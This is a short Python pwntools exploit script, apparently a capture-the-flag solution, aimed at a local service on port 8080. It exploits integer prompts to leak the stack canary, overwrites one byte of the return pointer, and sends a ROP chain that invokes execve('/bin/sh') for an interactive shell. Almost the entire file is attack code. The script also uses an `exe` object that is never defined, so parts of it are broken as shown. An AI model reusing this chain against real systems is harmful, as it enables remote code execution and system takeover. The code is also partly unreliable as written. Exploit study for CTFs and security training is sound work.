from pwn import *
import struct

io = remote('127.1', 8080)

io.readuntil(b'numbers:')
io.sendline(b"4294967295 1099511627775")

io.recvuntil(b"Congrats! Can you explain what's happening here?")
io.send(b"anu") # len 0x10 @ bss

io.recvuntil(b"Give me another two special numbers:\n> ")
io.sendline(b"4294967296 17179869184")

io.recvuntil(b"Give me one final pair of special numbers:\n> ")
io.sendline(b"8589934592 4294967296")

io.recvuntil(b"Horray! Here's a present for you, if you need it...\n")
canary_leak = int(io.readline().decode())
canary = u64(struct.pack("q", canary_leak))

print(f'[+] leaked canary: {hex(canary)}')

# original ret to puts at 401d1e
# skip puts and jump to read at 401d23
# read into rbp-0x30, so set it to bss:anu+0x30
thing3_fp = exe.sym.anu+0x30
io.send(b'A'*8+p64(canary)+p64(thing3_fp)+b'\x23') # 1 byte return pointer overwrite

# read more bytes by setting rdx and jumping to read again
call_read = 0x401d34
pop_rdx_rbx = 0x4a3dcb
payload = p64(pop_rdx_rbx)+p64(256)+p64(0)+p64(call_read)
io.send(p64(exe.sym.anu+8)+payload+p64(canary)+p64(exe.sym.anu)+p64(0x401d4d))

# send long payload
chain=b""
chain+=p64(0x00000000004a3dca )  # pop rax ;pop rdx ; pop rbx ; ret
chain+=p64(0x3b) 
chain+=p64(0x0 ) 
chain+=p64(0x0 ) 
chain+=p64(0x000000000040a58e ) #: pop rsi ; ret
chain+=p64(0 ) 
chain+=p64(0x000000000040251f ) #pop rdi ; ret
chain+=p64(exe.sym.anu+8) #  assumed it has /bin/sh  
chain+=p64(0x00000000004022d4 ) # syscall
io.send(p64(canary)+b'/bin/sh\x00'+b'A'*16+chain)

io.interactive()
